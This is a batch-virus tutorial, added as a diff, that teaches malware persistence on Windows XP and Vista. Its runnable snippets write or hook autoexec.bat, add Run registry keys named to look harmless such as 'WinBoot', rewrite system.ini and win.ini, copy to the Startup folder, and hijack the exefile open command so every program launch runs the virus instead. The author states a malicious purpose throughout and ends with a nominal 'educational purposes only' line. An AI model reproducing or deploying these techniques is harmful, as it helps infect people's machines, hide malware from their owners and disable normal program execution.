@@ -1,0 +1,176 @@
+
+
+                                                 TUTORIAL:
+
+                                   +_+_+_+_ Batch Startup Techniques ++_+_+_+_+
+
+                                                   by
+ 
+                                             cOrRuPt G3n3t!x
+
+
+   In this tutorial I will be discussing the different methods in which you can make your batch file execute
+   on startup, all of the ways depicted in this tutorial work on Windows Vista! It is essential for a proper
+   virus to startup each time the computer is booted so it can carry out it's routines on a frequent basis.
+   This tutorial is not for people trying to learn batch but rather for those trying to advance in batch!!
+   I would also like to send a big thanks to SAD1c for some of the code i used from his tutorials!!
+
+
+  1)Autoexec.bat Method:
+    -------------------
+
+   There are 2 differnt methods in autoexec.bat, we can either write the whole virus to autoexec.bat or
+   we can simply make a hook for autoexec.bat to call our virus. I personally prefer the hooking method, as 
+   an oversized autoexec.bat may raise a few eyebrows, however, I shall illustrate both methods.
+
+  a)Copying whole virus to autoexec.bat (this should be put in the begining of your virus):
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  attrib -r -h C:\autoexec.bat
+  echo.@echo off>>C:\autoexec.bat
+  echo.echo my virus would be here>>C:\autoexec.bat
+  echo.pause>>C:\autoexec.bat
+  attrib +r +h C:\autoexec.bat
+  -----------------------------------------------[Cut Here]---------------------------------------------
+   All you have to do is add your virus code lines in the lines where i put the 'echo my virus...' and 
+   'pause' adding more lines as needed, it will then write your virus code to autoexec.bat
+
+
+  b)Hooking Autoexec.bat Technique (HAT):
+
+   This is my prefered method and it will copy the current batch file to C:\virus.bat and then hook
+   the batch file C:\virus.bat for the next startup (Should be placed at begining of Virus):
+  -----------------------------------------------[Cut Here]---------------------------------------------
+ attrib -r -h C:\autoexec.bat
+  copy %0 C:\WinServ.bat >nul
+  type C:\autoexec.bat|find "WinServ.bat">C:\autoexec.bat
+  echo call C:\WinServ.bat>>C:\autoexec.bat
+  attrib +r +h C:\autoexec.bat
+  -----------------------------------------------[Cut Here]---------------------------------------------
+   All you need to do is change the batch name from Winserv.bat to your own, what this code will do is
+   write a new hooking line each startup to make sure the batch only gets called up once per start up.
+
+
+  2)Registery Method:
+    ----------------
+
+   This will show the various registery keys you could use to execute your batch file each run. Although
+   there are different registery keys doing different things, they will all - in practice - ultimately startup
+   your virus on each computer boot:
+
+   As I said before there are many variants; here are some:
+
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+  - HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\Windows\CurrentVersion\RunServices
+
+  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
+
+  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+   The "RunOnce" and "RunServicesOnce" deletes the registry key after running the file,
+   but this isn't a problem, because the batch file will be executed again, so it will add
+   the key. Now they all work on the same principle when adding the keys to the registery so
+   i shall now show you two keys the first is '-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+   This will then add a registery key in HKLM startup called 'WinBoot' and the path of the virus will be C:\virus.bat:
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat
+  -----------------------------------------------[Cut Here]---------------------------------------------
+   The name of the startup key and the location of the virus can be changed at will.
+
+   Next i will show the registery ADD key for HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   It works on the same principle except because we are dealling with HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE
+  we then write 'REG ADD HKCU...." See below:
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat
+  -----------------------------------------------[Cut Here]---------------------------------------------
+
+
+  3)System.ini Method:
+    ------------------
+
+   This method will make System.ini call your batch file up each startup, we cannot just write to the system.ini
+   as it will then delete whatever else was in their so instead we write a seperate file in %tmp% then
+   type it in to the sytem.ini pretty simple i'd say:
+  ----------------------------------------------[Cut Here]---------------------------------------------
+  copy %0 %windir%\WinDebug.bat
+  find /v /i "[boot]"<%WiNDir%\system.ini>temp1.tmp
+  find /v /i "shell=explorer.exe"<temp1.tmp>temp2.tmp
+  echo [boot]>%wIndIR%\system.ini
+  echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini
+  type temp2.tmp>>%WIndIR%\system.ini
+  del temp?.tmp
+  -----------------------------------------------[Cut Here]--------------------------------------------- 
+
+
+  4)Win.ini Method:
+    ---------------
+
+   We shall now do the same for win.ini; write to a temporary then type it into win.ini, see below:
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  copy %0 %windir%\TaskLoad.bat.
+  find /v /i "[windows]"<%windir%\win.ini>temp1.tmp
+  find /v /i "load="<temp1.tmp>temp2.tmp
+  find /v /i "run="<temp2.tmp>temp1.tmp
+  find /v /i "NullPort="<temp1.tmp>temp2.tmp
+  echo [windows]>%wiNdIR%\win.ini
+  echo load=TaskLoad.bat>>%winDIr%\win.ini
+  echo run=>>%wINDir%\win.ini
+  echo NullPort=None>>%windIr%\win.ini
+  type temp2.tmp>>%wiNDir%\win.ini
+  del temp?.tmp
+  -----------------------------------------------[Cut Here]--------------------------------------------- 
+
+
+  5)Startup Folder Method:
+    ---------------------
+
+   We will now look at the simplest and not very effective method as most computer literate people will look here
+   for any application that starts up, but still effective, however, i could not get it to write to windows
+   Vista startup folder, i have done it before but for the life of me i cannot remember the technique i used
+   so for now this method will only work on XP:
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  Copy %0 C:\WinBoot.bat
+  copy C:\WinBoot.bat "%UserProfile%\Start Menu\Programs\Startup\"
+  -----------------------------------------------[Cut Here]--------------------------------------------- 
+
+
+  6)Shell Spawning:
+    ---------------
+
+   Shell spawning was first seen in SAD1c's BOM batch generator, what it does is associate our batch file 
+   with the extension of an .exe or anything else we give it, so each time an .exe is opened, it will then 
+   instead open our batch file and the .exe wont be opened, a very good way to keep our batch in memory.
+   I tried out SAD1c's Shell spawn and it did not gel to well with my windows vista, so instead i made my
+   own; similar but alot smaller and less complex:
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  copy %0 C:\WinBat.bat
+  echo.on error resume next>temp.vbs
+  echo set sh=createobject("wscript.shell")>>temp.vbs
+  echo sh.regwrite "HKCR\exefile\Shell\Open\Command\","wscript.exe C:\CmdLoad.vbs ""%%1 %%*""">>temp.vbs
+  cscript temp.vbs
+  del temp.vbs
+  echo.set shell = createobject("wscript.shell")>>C:\CmdLoad.vbs
+  echo.shell.run "C:\WinBat.bat">>C:\CmdLoad.vbs
+  -----------------------------------------------[Cut Here]---------------------------------------------
+  It is important to take into account, that alot of .exe's will be executed therefore your batch will 
+  untechnically have residency, so if your batch is set to send over p2p etc and it is contionusly executed
+  this could slow down systems even to a halt!! We therefore should make parameters, and if they are
+  met then only is the batch routine executed.
+
+
+ Thanks alot for taking your time to read this, i hope it will help you with further ventures into more awesome
+ batch virii. Please contact me for any queries, problems etc. REMEMBER THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY!!
+
+
+
+  [?]Contact Me:
+    -----------
+
+  [@]immortalassassin@rocketmail.com
+
+
+ 
+
+ 
